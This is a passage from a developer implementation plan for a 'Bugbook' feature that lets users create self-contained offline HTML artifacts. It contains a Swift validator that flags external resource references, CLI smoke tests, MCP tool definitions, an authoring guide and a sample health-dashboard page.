        report.warnings.append("Artifact is \(report.sizeBytes) bytes; artifacts over \(artifactSizeWarnBytes) bytes (2 MB) load slowly. Consider slimming the embedded data.")
    }

    if let manifest = ArtifactManifest.parse(artifactScanPrefix(of: html)) {
        report.title = manifest.title
        report.icon = manifest.icon
        report.generator = manifest.generator
        if manifest.version != 1 {
            report.warnings.append("Unknown bugbook-artifact format version \(manifest.version); this build understands version 1.")
        }
        if manifest.title == nil {
            report.warnings.append("Missing <meta name=\"bugbook-title\" ...>; the pane title will fall back to the file name.")
        }
    } else {
        let ns = html as NSString
        if markerMetaRegex.firstMatch(in: html, options: [], range: NSRange(location: 0, length: ns.length)) != nil {
            report.errors.append("<meta name=\"bugbook-artifact\"> appears after the first \(ArtifactManifest.scanByteLimit) bytes; Bugbook only scans the first \(ArtifactManifest.scanByteLimit) bytes. Move the bugbook meta tags to the top of <head>.")
        } else {
            report.errors.append("Missing required <meta name=\"bugbook-artifact\" content=\"1\"> marker. Add the bugbook meta tags to <head>.")
        }
    }

    validateEmbeddedManifestJSON(in: html, report: &report)
    appendExternalReferenceFindings(in: html, report: &report)
    return report
}

private func artifactScanPrefix(of html: String) -> String {
    String(decoding: Data(html.utf8.prefix(ArtifactManifest.scanByteLimit)), as: UTF8.self)
}

// MARK: - External reference scanning

private let tagRegex = try! NSRegularExpression(
    pattern: "<([a-zA-Z][a-zA-Z0-9:-]*)((?:\"[^\"]*\"|'[^']*'|[^>\"'])*)>",
    options: []
)
private let attributeRegex = try! NSRegularExpression(
    pattern: "(?:^|\\s)(srcset|src|xlink:href|href|poster|formaction|action|data)\\s*=\\s*(\"[^\"]*\"|'[^']*'|[^\\s>]+)",
    options: [.caseInsensitive]
)
private let cssURLRegex = try! NSRegularExpression(
    pattern: "url\\(\\s*[\"']?\\s*(?:https?:|wss?:|ws:|file:|//)",
    options: [.caseInsensitive]
)
private let cssImportRegex = try! NSRegularExpression(
    pattern: "@import\\s*(?:url\\(\\s*)?[\"']?\\s*(?:https?:|wss?:|ws:|file:|//)",
    options: [.caseInsensitive]
)
private let markerMetaRegex = try! NSRegularExpression(
    pattern: "<meta\\s[^>]*name\\s*=\\s*[\"']bugbook-artifact[\"']",
    options: [.caseInsensitive]
)
private let manifestScriptRegex = try! NSRegularExpression(
    pattern: "<script\\s[^>]*type\\s*=\\s*[\"']application/bugbook-manifest[\"'][^>]*>(.*?)</script>",
    options: [.caseInsensitive, .dotMatchesLineSeparators]
)
private let httpEquivRefreshRegex = try! NSRegularExpression(
    pattern: "http-equiv\\s*=\\s*[\"']?\\s*refresh",
    options: [.caseInsensitive]
)
private let metaRefreshURLRegex = try! NSRegularExpression(
    pattern: "url\\s*=\\s*[\"']?\\s*(?:https?:|wss?:|//)",
    options: [.caseInsensitive]
)
private let networkAPIRegex = try! NSRegularExpression(
    pattern: "(?:fetch|XMLHttpRequest|WebSocket|EventSource|sendBeacon|importScripts)\\s*\\(\\s*[\"'](?:https?:|wss?:|ws:|//)",
    options: [.caseInsensitive]
)

/// Tags whose href is user-activated navigation (gated behind the native
/// confirmation sheet at render time) rather than a silent resource load.
private let clickNavigationTags: Set<String> = ["a", "area"]

private func appendExternalReferenceFindings(in html: String, report: inout ArtifactValidationReport) {
    let ns = html as NSString
    let fullRange = NSRange(location: 0, length: ns.length)

    for tagMatch in tagRegex.matches(in: html, options: [], range: fullRange) {
        let tagName = ns.substring(with: tagMatch.range(at: 1)).lowercased()
        guard tagMatch.range(at: 2).length > 0 else { continue }
        let attrText = ns.substring(with: tagMatch.range(at: 2))
        let attrNS = attrText as NSString
        let attrRange = NSRange(location: 0, length: attrNS.length)
        let line = lineNumber(at: tagMatch.range.location, in: ns)

        for attrMatch in attributeRegex.matches(in: attrText, options: [], range: attrRange) {
            let name = attrNS.substring(with: attrMatch.range(at: 1)).lowercased()
            let value = unquotedAttributeValue(attrNS.substring(with: attrMatch.range(at: 2)))

            if name == "srcset" {
                for candidate in srcsetCandidates(value) where isExternalReference(candidate) {
                    report.errors.append(externalReferenceError(line: line, context: "srcset on <\(tagName)>", value: candidate))
                }
                continue
            }
            if name == "href", clickNavigationTags.contains(tagName) {
                continue
            }
            if isExternalReference(value) {
                report.errors.append(externalReferenceError(line: line, context: "\(name) on <\(tagName)>", value: value))
            }
        }

        if tagName == "meta",
           httpEquivRefreshRegex.firstMatch(in: attrText, options: [], range: attrRange) != nil,
           metaRefreshURLRegex.firstMatch(in: attrText, options: [], range: attrRange) != nil {
            report.errors.append("line \(line): <meta http-equiv=\"refresh\"> redirects to an external URL — remove it; artifacts cannot navigate on their own.")
        }
    }

    for match in cssURLRegex.matches(in: html, options: [], range: fullRange) {
        report.errors.append("line \(lineNumber(at: match.range.location, in: ns)): external url() reference in CSS — inline the asset as a data: URI or embed the styles directly.")
    }
    for match in cssImportRegex.matches(in: html, options: [], range: fullRange) {
        report.errors.append("line \(lineNumber(at: match.range.location, in: ns)): @import of an external stylesheet — copy the CSS into an inline <style> block.")
    }
    for match in networkAPIRegex.matches(in: html, options: [], range: fullRange) {
        report.warnings.append("line \(lineNumber(at: match.range.location, in: ns)): script calls a network API with an external URL — all network is blocked at render time; embed the data as <script type=\"application/json\"> instead.")
    }
}

private func validateEmbeddedManifestJSON(in html: String, report: inout ArtifactValidationReport) {
    let ns = html as NSString
    guard let match = manifestScriptRegex.firstMatch(in: html, options: [], range: NSRange(location: 0, length: ns.length)) else {
        return
    }
    let body = ns.substring(with: match.range(at: 1)).trimmingCharacters(in: .whitespacesAndNewlines)
    do {
        let object = try JSONSerialization.jsonObject(with: Data(body.utf8))
        if !(object is [String: Any]) {
            report.errors.append("bugbook-manifest must be a JSON object.")
        }
    } catch {
        report.errors.append("bugbook-manifest JSON does not parse: \(error.localizedDescription)")
    }
    if Data(ns.substring(to: match.range.location).utf8).count > ArtifactManifest.scanByteLimit {
        report.warnings.append("bugbook-manifest script starts after the first \(ArtifactManifest.scanByteLimit) bytes; the app's bounded scan will not see it. Move it into <head> right after the meta tags.")
    }
}

private func externalReferenceError(line: Int, context: String, value: String) -> String {
    "line \(line): external \(context): \"\(truncatedForMessage(value))\" — artifacts must be fully self-contained; inline the resource (data: URI, inline <script>/<style>, embedded JSON). http(s)/ws(s)/file/protocol-relative references are rejected."
}

private func isExternalReference(_ value: String) -> Bool {
    let v = value.trimmingCharacters(in: .whitespacesAndNewlines).lowercased()
    return v.hasPrefix("http:") || v.hasPrefix("https:") || v.hasPrefix("ws:")
        || v.hasPrefix("wss:") || v.hasPrefix("file:") || v.hasPrefix("//")
}

private func srcsetCandidates(_ value: String) -> [String] {
    value.components(separatedBy: ",").compactMap { part in
        let trimmed = part.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !trimmed.isEmpty else { return nil }
        return trimmed.components(separatedBy: .whitespaces).first
    }
}

private func unquotedAttributeValue(_ raw: String) -> String {
    var value = raw.trimmingCharacters(in: .whitespacesAndNewlines)
    if value.count >= 2,
       (value.hasPrefix("\"") && value.hasSuffix("\"")) || (value.hasPrefix("'") && value.hasSuffix("'")) {
        value = String(value.dropFirst().dropLast())
    }
    return value.trimmingCharacters(in: .whitespacesAndNewlines)
}

private func truncatedForMessage(_ value: String) -> String {
    value.count > 96 ? String(value.prefix(96)) + "…" : value
}

private func lineNumber(at location: Int, in text: NSString) -> Int {
    var line = 1
    let bound = min(location, text.length)
    var index = 0
    while index < bound {
        if text.character(at: index) == 0x0A { line += 1 }
        index += 1
    }
    return line
}

// MARK: - Path resolution

func resolveArtifactWritePath(_ rawPath: String, workspace: String) throws -> String {
    let normalizedWorkspace = normalizePath(workspace)
    let expanded = (rawPath as NSString).expandingTildeInPath
    let absolute = expanded.hasPrefix("/")
        ? normalizePath(expanded)
        : normalizePath((normalizedWorkspace as NSString).appendingPathComponent(rawPath))

    guard isPathInsideWorkspace(absolute, workspace: normalizedWorkspace) else {
        throw CLIError.invalidInput("Artifact path must be inside the workspace: \(rawPath)")
    }
    guard absolute.lowercased().hasSuffix(".html") else {
        throw CLIError.invalidInput("Artifact path must end in .html: \(rawPath)")
    }
    let baseName = ((absolute as NSString).lastPathComponent as NSString).deletingPathExtension
    guard !baseName.isEmpty else {
        throw CLIError.invalidInput("Artifact path must include a file name: \(rawPath)")
    }
    return absolute
}

func resolveArtifactReadPath(_ rawPath: String, workspace: String) throws -> String {
    let expanded = (rawPath as NSString).expandingTildeInPath
    let absolute = expanded.hasPrefix("/")
        ? normalizePath(expanded)
        : normalizePath((normalizePath(workspace) as NSString).appendingPathComponent(rawPath))
    guard FileManager.default.fileExists(atPath: absolute) else {
        throw CLIError.fileNotFound(rawPath)
    }
    return absolute
}
```

Register in `Sources/BugbookCLI/BugbookCLI.swift:10` — insert `Artifact.self` after `Page.self`:

```diff
-        subcommands: [Page.self, Block.self, Backlinks.self, ...]
+        subcommands: [Page.self, Artifact.self, Block.self, Backlinks.self, ...]
```

Known accepted lint limitations (fine to note in the commit message): references inside HTML comments are still flagged; deliberate obfuscation is out of scope because the runtime sandbox enforces.

- [ ] **Step 7.4: Run to verify pass**

Run: `swift test --filter BugbookCLITests`
Expected: PASS (6 new tests + all existing). Spot-check help: `swift run BugbookCLI artifact --help`.

- [ ] **Step 7.5: Commit**

```bash
git add Sources/BugbookCLI/Commands/ArtifactCommand.swift Sources/BugbookCLI/BugbookCLI.swift Tests/BugbookCLITests/BugbookCLITests.swift
git commit -m "Add bugbook artifact create/validate/list CLI command"
```

---

## Task 8: smoke-cli.sh artifact round-trip

**Files:**
- Modify: `scripts/smoke-cli.sh` (insert after `echo "[smoke] files: ok"`, before the final `ALL_SMOKE_TESTS_PASSED` echo — verified at lines 62-65)

- [ ] **Step 8.1: Add the smoke block**

```bash
mkdir -p "$WS/.smoke"
cat > "$WS/.smoke/good.html" <<'HTML'
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="bugbook-artifact" content="1">
<meta name="bugbook-title" content="Sleep Trends">
<meta name="bugbook-generator" content="smoke-cli">
<style>body { font-family: -apple-system, sans-serif; }</style>
</head>
<body>
<h1>Sleep Trends</h1>
<script type="application/json" id="data">[{"day":"2026-06-01","hours":7.4}]</script>
<script>document.body.append(JSON.parse(document.getElementById("data").textContent).length + " rows");</script>
</body>
</html>
HTML

ART_JSON="$(run_bb artifact create 'Weekly Review/sleep-trends.html' --workspace "$WS" --content-file "$WS/.smoke/good.html")"
echo "$ART_JSON" | jq -e '.created == true and .relative_path == "Weekly Review/sleep-trends.html"' >/dev/null
echo "$ART_JSON" | jq -e '.markdown_link == "[Sleep Trends](Weekly Review/sleep-trends.html)"' >/dev/null
echo "[smoke] artifact create: ok"

VAL_JSON="$(run_bb artifact validate 'Weekly Review/sleep-trends.html' --workspace "$WS")"
echo "$VAL_JSON" | jq -e '.valid == true' >/dev/null
echo "[smoke] artifact validate: ok"

cat > "$WS/.smoke/bad.html" <<'HTML'
<!DOCTYPE html>
<html>
<head>
<meta name="bugbook-artifact" content="1">
<meta name="bugbook-title" content="Bad">
<script src="https://cdn.example.com/chart.min.js"></script>
</head>
<body></body>
</html>
HTML

if BAD_JSON="$(run_bb artifact create 'bad-artifact.html' --workspace "$WS" --content-file "$WS/.smoke/bad.html")"; then
  echo "[smoke] artifact create should have failed on a CDN reference"
  exit 1
fi
echo "$BAD_JSON" | jq -e '.created == false and (.errors | length >= 1)' >/dev/null
[ ! -f "$WS/bad-artifact.html" ]
echo "[smoke] artifact rejects CDN: ok"

LIST_JSON="$(run_bb artifact list --workspace "$WS")"
echo "$LIST_JSON" | jq -e 'length == 1 and .[0].relative_path == "Weekly Review/sleep-trends.html" and .[0].title == "Sleep Trends"' >/dev/null
echo "[smoke] artifact list: ok"
```

(`.smoke/` is dot-prefixed so `artifact list` ignores it; the `if VAR=$(cmd)` form is `set -e`-safe and still captures stdout on failure.)

- [ ] **Step 8.2: Run and commit**

Run: `bash scripts/smoke-cli.sh`
Expected: all `[smoke] artifact …: ok` lines and the final `ALL_SMOKE_TESTS_PASSED`.

```bash
git add scripts/smoke-cli.sh
git commit -m "Add artifact round-trip to CLI smoke test"
```

---

## Task 9: MCP tools

**Files:**
- Modify: `mcp-server/index.js` (`writeTmp` ~line 41; new `runStatus` helper after `run()` ~line 38; two tools before `// Start the server` ~line 276)

- [ ] **Step 9.1: Implement**

Change `writeTmp` to take an extension (backwards-compatible):

```js
// Write content to a temp file, return its path
async function writeTmp(content, ext = ".md") {
  const p = join(tmpdir(), `bugbook-mcp-${randomUUID()}${ext}`);
  await writeFile(p, content, "utf-8");
  return p;
}
```

Add after `run()` — needed because artifact validation failures put the JSON report on **stdout** with a nonzero exit, which `run()` (rejects with stderr) would discard:

```js
// Run a bugbook CLI command, never rejecting on nonzero exit.
// Artifact validation prints its JSON error report to stdout and exits 1,
// so callers need both the exit code and stdout.
function runStatus(args) {
  return new Promise((resolve) => {
    execFile(BUGBOOK, args, { maxBuffer: 10 * 1024 * 1024 }, (err, stdout, stderr) => {
      const code = err ? (typeof err.code === "number" ? err.code : 1) : 0;
      const errText = (stderr ?? "").trim() || (err && !stdout ? err.message : "");
      resolve({ code, stdout: stdout ?? "", stderr: errText });
    });
  });
}
```

Append the two tools before `// Start the server`. The descriptions carry the self-containment contract so models see it at tool-selection time (design doc §4.5):

```js
// bugbook_artifact_create
server.tool(
  "bugbook_artifact_create",
  "Create a self-contained interactive HTML artifact in the Bugbook workspace. " +
  "Artifacts render in a sandboxed OFFLINE webview, so the HTML must be ONE fully " +
  "self-contained file: all CSS and JS inline, data embedded as <script " +
  "type=\"application/json\">, NO external resources (no CDN scripts, remote " +
  "stylesheets, images, fonts — fetch/WebSocket are blocked at render time too). " +
  "Plain <a href=\"https://...\"> links are allowed (they open behind a native " +
  "confirmation). Required in <head>: <meta name=\"bugbook-artifact\" content=\"1\"> " +
  "and <meta name=\"bugbook-title\" content=\"...\">. Place page-attached artifacts " +
  "at '<Page Name>/<topic>.html' and row-attached at '<Database>/_artifacts/" +
  "<row-slug>-<topic>.html'. Validation runs automatically: on failure nothing is " +
  "written and the errors are returned. The result includes a markdown_link line — " +
  "always add it to the parent page or row body.",
  {
    path: z.string().describe("Workspace-relative target path ending in .html"),
    html: z.string().describe("Complete self-contained HTML document"),
  },
  async ({ path, html }) => {
    let tmp;
    try {
      tmp = await writeTmp(html, ".html");
      const { code, stdout, stderr } = await runStatus(["artifact", "create", path, "--content-file", tmp]);
      return code === 0 ? ok(stdout) : fail(stdout.trim() || stderr || "artifact create failed");
    } catch (e) {
      return fail(e.message);
    } finally {
      if (tmp) await cleanTmp(tmp);
    }
  }
);

// bugbook_artifact_validate
server.tool(
  "bugbook_artifact_validate",
  "Validate an existing HTML artifact in the Bugbook workspace. Checks the required " +
  "<meta name=\"bugbook-artifact\" content=\"1\"> marker, rejects any external " +
  "resource reference (script/link/img/css url()/@import/meta-refresh — artifacts " +
  "must inline everything; only clickable <a href> links are allowed), and enforces " +
  "size limits (warn >2MB, error >10MB). Returns a JSON report with errors and " +
  "warnings; fix every error and re-validate.",
  {
    path: z.string().describe("Workspace-relative or absolute path to a .html artifact"),
  },
  async ({ path }) => {
    try {
      const { code, stdout, stderr } = await runStatus(["artifact", "validate", path]);
      return code === 0 ? ok(stdout) : fail(stdout.trim() || stderr || "artifact validation failed");
    } catch (e) {
      return fail(e.message);
    }
  }
);
```

- [ ] **Step 9.2: Verify — syntax + live smoke (design doc §7.5)**

The MCP tools don't pass `--workspace` (the CLI resolves its default), so the smoke pins the workspace with a one-line shim binary — ArgumentParser accepts options after positional arguments:

```bash
node --check mcp-server/index.js
swift build   # ensure .build/debug/BugbookCLI is fresh

SCRATCH=$(mktemp -d)
REPO="$PWD"
cat > /tmp/bugbook-smoke-bin <<EOF
#!/bin/bash
exec "$REPO/.build/debug/BugbookCLI" "\$@" --workspace "$SCRATCH"
EOF
chmod +x /tmp/bugbook-smoke-bin

cat > /tmp/mcp-artifact-smoke.mjs <<'EOF'
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";

const transport = new StdioClientTransport({
  command: "node",
  args: ["index.js"],
  env: { ...process.env },
});
const client = new Client({ name: "smoke", version: "1.0.0" });
await client.connect(transport);

const html = `<!DOCTYPE html><html><head>
<meta name="bugbook-artifact" content="1">
<meta name="bugbook-title" content="MCP Smoke">
</head><body><h1>ok</h1></body></html>`;

const created = await client.callTool({
  name: "bugbook_artifact_create",
  arguments: { path: "Smoke/mcp-test.html", html },
});
console.log(created.content[0].text);
if (created.isError) process.exit(1);

const validated = await client.callTool({
  name: "bugbook_artifact_validate",
  arguments: { path: "Smoke/mcp-test.html" },
});
console.log(validated.content[0].text);
process.exit(validated.isError ? 1 : 0);
EOF

cd mcp-server && BUGBOOK_BIN=/tmp/bugbook-smoke-bin node /tmp/mcp-artifact-smoke.mjs; cd ..
ls "$SCRATCH/Smoke/mcp-test.html"   # file landed in the scratch workspace
```

Expected: `"created": true` JSON, then `"valid": true` JSON, exit 0, and the file exists in `$SCRATCH`.

- [ ] **Step 9.3: Commit**

```bash
git add mcp-server/index.js
git commit -m "Add MCP artifact create and validate tools"
```

---

## Task 10: Authoring skill, demo artifacts, wreview update, AiService reword

**Files:**
- Create: `plugins/bugbook/skills/artifact/SKILL.md`
- Create: `plugins/bugbook/skills/artifact/examples/health-dashboard.html`
- Create: `plugins/bugbook/skills/artifact/examples/ticket-board.html`
- Modify: `plugins/bugbook/skills/wreview/SKILL.md`
- Modify: `Sources/Bugbook/Services/AiService.swift:67`

- [ ] **Step 10.1: Create the authoring skill**

Create `plugins/bugbook/skills/artifact/SKILL.md` (first skill with an `examples/` subdirectory — fine; skills reference extra files by relative path):

````markdown
---
name: artifact
description: Author self-contained interactive HTML artifacts in Bugbook — charts, dashboards, kanban boards, sortable tables, and visual reports rendered in a sandboxed offline pane next to markdown notes. Use when markdown cannot express the output, when the user asks for a chart, graph, dashboard, board, timeline, interactive table, or visualization, or says "artifact", "chart this", "visualize this", or "make it interactive". Also used by other skills (wreview, flow) to emit rich companions to markdown summaries.
---

# HTML Artifacts (/artifact)

An artifact is ONE self-contained `.html` file rendered in a sandboxed, fully
offline pane. Markdown stays the source of truth; an artifact is a rendered,
regenerable projection — delete it and you lose nothing but pixels.

## The contract (non-negotiable)

1. **One file, fully self-contained.** All CSS in `<style>`, all JS in
   `<script>`, all data embedded. No companion assets, no folders.
2. **Zero network.** The renderer blocks ALL network (CSP + content rules).
   External `<script src>`, `<link href>`, images, fonts, `@import`,
   CSS `url(...)`, `fetch()`, `WebSocket` — all fail at render time, and
   `bugbook artifact validate` hard-errors on the declarative ones (including
   protocol-relative `//cdn...` URLs). Inline everything; small images as
   `data:` URIs. Exception: plain `<a href="https://...">` links are allowed —
   clicks route through a native confirmation sheet.
3. **Embed data as JSON**, then parse it:
   ```html
   <script type="application/json" id="data">[{"day":"2026-06-01","hours":7.4}]</script>
   <script>const DATA = JSON.parse(document.getElementById("data").textContent);</script>
   ```
4. **Required meta tags** at the top of `<head>` (Bugbook scans only the first
   4 KB):
   ```html
   <meta name="bugbook-artifact" content="1">              <!-- required marker -->
   <meta name="bugbook-title" content="Sleep Trends — 2026-W23">
   <meta name="bugbook-icon" content="sf:bed.double">      <!-- SF Symbol, optional -->
   <meta name="bugbook-generator" content="claude-code/wreview">
   ```
5. **System fonts + dark mode.** Use the system font stack and support
   `prefers-color-scheme: dark` via CSS variables. Never load web fonts.
6. **No libraries.** Hand-roll charts as inline SVG (see
   `examples/health-dashboard.html`). No Chart.js, no D3, no CDN anything.
7. **Always link from markdown.** After creating an artifact, append the
   `markdown_link` from the command output to the parent page or row body.
   An unlinked artifact is invisible to the markdown spine.
8. **Stay small.** Validation warns over 2 MB and errors over 10 MB. Slim the
   embedded data to what the view needs.
9. **Static snapshot only (Level 1).** There is no data bridge yet — do not
   fake `window.bugbook.query()`. Note in the UI when interactions are
   visual-only.

## Placement conventions

- **Page-attached:** `<Page Name>/<topic>.html` — the page's companion folder.
  `Weekly Review.md` → `Weekly Review/sleep-trends.html`.
- **Row-attached:** `<Database>/_artifacts/<row-slug>-<topic>.html`.
  `Weekly Reviews/_artifacts/2026-W23-health.html`. The `_` prefix keeps it
  out of row counts and `_index.json`.

## Workflow

```bash
WS="$HOME/Library/Mobile Documents/iCloud~com~bugbook~app/Documents/Bugbook"

# 1. Write the HTML to a temp file (or pipe via --content-file -)
# 2. Create — validation runs automatically; nothing is written on failure
bugbook artifact create "Weekly Review/sleep-trends.html" \
  --workspace "$WS" --content-file /tmp/sleep-trends.html

# 3. Fix any reported errors (usually an external reference to inline), re-run.
# 4. Take "markdown_link" from the output and add it to the parent body:
bugbook page update "Weekly Review" --workspace "$WS" \
  --section "Health" --append-file - <<'MD'
[Sleep Trends](Weekly Review/sleep-trends.html)
MD

# Re-validate or inventory at any time
bugbook artifact validate "Weekly Review/sleep-trends.html" --workspace "$WS"
bugbook artifact list --workspace "$WS"
```

Regeneration is normal: `artifact create` overwrites the same path, and an
open pane live-reloads. Regenerate from source data rather than editing
artifacts in place.

## Skeleton (complete minimal artifact)

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="bugbook-artifact" content="1">
<meta name="bugbook-title" content="Example Bars">
<meta name="bugbook-icon" content="sf:chart.bar">
<meta name="bugbook-generator" content="claude-code/artifact">
<style>
  :root { --bg: #fff; --fg: #1d1d1f; --muted: #6e6e73; --bar: #0a84ff; --card: #f5f5f7; }
  @media (prefers-color-scheme: dark) {
    :root { --bg: #1c1c1e; --fg: #f5f5f7; --muted: #98989d; --card: #2c2c2e; }
  }
  body { background: var(--bg); color: var(--fg); margin: 0; padding: 20px;
         font: 14px/1.45 -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
  svg { width: 100%; height: auto; background: var(--card); border-radius: 10px; }
  text { fill: var(--muted); font-size: 9px; font-family: inherit; }
</style>
</head>
<body>
<h1>Example Bars</h1>
<div id="chart"></div>
<script type="application/json" id="data">[4, 7, 2, 9, 5]</script>
<script>
const DATA = JSON.parse(document.getElementById("data").textContent);
const W = 600, H = 160, P = 20, max = Math.max(...DATA);
const bw = (W - 2 * P) / DATA.length;
let s = "";
DATA.forEach((v, i) => {
  const h = (H - 2 * P) * v / max;
  s += `<rect x="${P + i * bw + 4}" y="${H - P - h}" width="${bw - 8}" height="${h}"
        fill="var(--bar)" rx="3"><title>${v}</title></rect>`;
});
document.getElementById("chart").innerHTML =
  `<svg viewBox="0 0 ${W} ${H}" role="img">${s}</svg>`;
</script>
</body>
</html>
```

## Reference examples (copy these, swap the data)

- `examples/health-dashboard.html` — stat cards, four hand-rolled SVG panels
  (stacked sleep bars, resting-HR line, steps bars, stress line over body
  battery range bands), 7d/14d toggle, dark mode.
- `examples/ticket-board.html` — kanban columns by status, filter chips,
  text search, visual-only drag with snapshot note.
````

- [ ] **Step 10.2: Create the demo artifacts**

Create `plugins/bugbook/skills/artifact/examples/health-dashboard.html` with exactly this content:

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="bugbook-artifact" content="1">
<meta name="bugbook-title" content="Health Dashboard — Sample 14 Days">
<meta name="bugbook-icon" content="sf:heart.text.square">
<meta name="bugbook-generator" content="bugbook-skill/artifact-example">
<style>
:root {
  --bg: #ffffff; --fg: #1d1d1f; --muted: #6e6e73; --card: #f5f5f7;
  --grid: #e3e3e8; --accent: #0a84ff; --deep: #5e5ce6; --rem: #bf5af2;
  --light: #b8c9f5; --steps: #30b0c7; --bb: rgba(48, 209, 88, 0.35); --stress: #ff9f0a;
}
@media (prefers-color-scheme: dark) {
  :root {
    --bg: #1c1c1e; --fg: #f5f5f7; --muted: #98989d; --card: #2c2c2e;
    --grid: #3a3a3c; --light: #4a5878; --bb: rgba(48, 209, 88, 0.3);
  }
}
* { box-sizing: border-box; margin: 0; }
body { background: var(--bg); color: var(--fg); padding: 20px; max-width: 760px; margin: 0 auto;
       font: 14px/1.45 -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; }
header { display: flex; align-items: baseline; justify-content: space-between; margin-bottom: 14px; }
h1 { font-size: 20px; }
h2 { font-size: 12px; color: var(--muted); font-weight: 600; text-transform: uppercase;
     letter-spacing: 0.4px; margin: 18px 0 6px; }
.toggle button { background: var(--card); color: var(--fg); border: 1px solid var(--grid);
                 padding: 4px 12px; font: inherit; cursor: pointer; }
.toggle button:first-child { border-radius: 6px 0 0 6px; }
.toggle button:last-child { border-radius: 0 6px 6px 0; margin-left: -1px; }
.toggle button.active { background: var(--accent); border-color: var(--accent); color: #fff; }
.cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(128px, 1fr)); gap: 8px; }
.card { background: var(--card); border-radius: 10px; padding: 10px 12px; }
.card .label { font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.4px; }
.card .value { font-size: 20px; font-weight: 600; margin: 2px 0; font-variant-numeric: tabular-nums; }
.card .sub { font-size: 11px; color: var(--muted); }
svg { width: 100%; height: auto; display: block; background: var(--card); border-radius: 10px; }
.grid { stroke: var(--grid); stroke-width: 1; }
.tick { fill: var(--muted); font-size: 9px; font-family: inherit; }
rect.deep { fill: var(--deep); } rect.rem { fill: var(--rem); } rect.light { fill: var(--light); }
rect.steps { fill: var(--steps); } rect.bb { fill: var(--bb); }
.line { fill: none; stroke-width: 2; stroke-linejoin: round; stroke-linecap: round; }
.line.rhr { stroke: var(--accent); } .line.stress { stroke: var(--stress); }
.dot { fill: var(--accent); }
.legend { font-size: 11px; color: var(--muted); margin-top: 4px; display: flex; gap: 12px; }
.swatch { display: inline-block; width: 9px; height: 9px; border-radius: 2px;
          margin-right: 4px; vertical-align: -1px; }
footer { margin-top: 18px; font-size: 11px; color: var(--muted); }
</style>
</head>
<body>
<header>
  <h1>Health Dashboard</h1>
  <div class="toggle" id="toggle">
    <button data-days="7">7d</button>
    <button data-days="14" class="active">14d</button>
  </div>
</header>

<section id="stats" class="cards"></section>

<h2>Sleep</h2>
<div id="sleep"></div>
<div class="legend">
  <span><span class="swatch" style="background:var(--deep)"></span>Deep</span>
  <span><span class="swatch" style="background:var(--rem)"></span>REM</span>
  <span><span class="swatch" style="background:var(--light)"></span>Light</span>
</div>

<h2>Resting Heart Rate</h2>
<div id="rhr"></div>

<h2>Steps</h2>
<div id="steps"></div>

<h2>Stress &amp; Body Battery</h2>
<div id="energy"></div>
<div class="legend">
  <span><span class="swatch" style="background:var(--bb)"></span>Body battery range</span>
  <span><span class="swatch" style="background:var(--stress)"></span>Avg stress</span>
</div>

<footer>Sample data — regenerate with real Garmin rows (e.g. via /wreview).</footer>

<script type="application/json" id="data">
[
{"date":"2026-05-25","sleep":7.4,"deep":1.2,"rem":1.6,"rhr":49,"steps":9420,"stress":31,"bbMin":28,"bbMax":88},
{"date":"2026-05-26","sleep":6.8,"deep":1.0,"rem":1.3,"rhr":50,"steps":11250,"stress":36,"bbMin":22,"bbMax":81},
{"date":"2026-05-27","sleep":7.9,"deep":1.4,"rem":1.8,"rhr":48,"steps":7680,"stress":27,"bbMin":35,"bbMax":92},
{"date":"2026-05-28","sleep":6.1,"deep":0.8,"rem":1.1,"rhr":52,"steps":13400,"stress":41,"bbMin":15,"bbMax":74},
{"date":"2026-05-29","sleep":7.2,"deep":1.1,"rem":1.5,"rhr":51,"steps":8210,"stress":34,"bbMin":24,"bbMax":83},
{"date":"2026-05-30","sleep":8.3,"deep":1.6,"rem":2.0,"rhr":47,"steps":5140,"stress":22,"bbMin":41,"bbMax":96},
{"date":"2026-05-31","sleep":7.7,"deep":1.3,"rem":1.7,"rhr":48,"steps":6890,"stress":25,"bbMin":37,"bbMax":94},
{"date":"2026-06-01","sleep":6.5,"deep":0.9,"rem":1.2,"rhr":51,"steps":12080,"stress":38,"bbMin":19,"bbMax":78},
{"date":"2026-06-02","sleep":7.1,"deep":1.1,"rem":1.4,"rhr":50,"steps":9860,"stress":33,"bbMin":26,"bbMax":84},
{"date":"2026-06-03","sleep":7.6,"deep":1.3,"rem":1.6,"rhr":49,"steps":8540,"stress":29,"bbMin":31,"bbMax":89},
{"date":"2026-06-04","sleep":6.3,"deep":0.9,"rem":1.1,"rhr":53,"steps":14210,"stress":43,"bbMin":12,"bbMax":71},
{"date":"2026-06-05","sleep":7.8,"deep":1.4,"rem":1.7,"rhr":49,"steps":7320,"stress":28,"bbMin":33,"bbMax":91},
{"date":"2026-06-06","sleep":8.1,"deep":1.5,"rem":1.9,"rhr":46,"steps":4980,"stress":21,"bbMin":44,"bbMax":97},
{"date":"2026-06-07","sleep":7.0,"deep":1.1,"rem":1.4,"rhr":48,"steps":10350,"stress":30,"bbMin":27,"bbMax":86}
]
</script>
<script>
const ALL = JSON.parse(document.getElementById("data").textContent);
let days = 14;

const W = 660, H = 170, PT = 12, PR = 8, PB = 22, PL = 36;
const IW = W - PL - PR, IH = H - PT - PB;
const scaleX = (i, n) => PL + (i + 0.5) * IW / n;
const bandX = (i, n) => { const bw = IW / n; return [PL + i * bw + bw * 0.15, bw * 0.7]; };
const scaleY = (v, lo, hi) => PT + IH - (v - lo) / (hi - lo) * IH;
const svg = inner => `<svg viewBox="0 0 ${W} ${H}" role="img">${inner}</svg>`;

function frame(lo, hi, fmtTick) {
  let s = "";
  for (let k = 0; k <= 3; k++) {
    const v = lo + (hi - lo) * k / 3, y = scaleY(v, lo, hi);
    s += `<line x1="${PL}" y1="${y}" x2="${W - PR}" y2="${y}" class="grid"/>`;
    s += `<text x="${PL - 6}" y="${y + 3}" class="tick" text-anchor="end">${fmtTick(v)}</text>`;
  }
  return s;
}

function dayLabels(rows) {
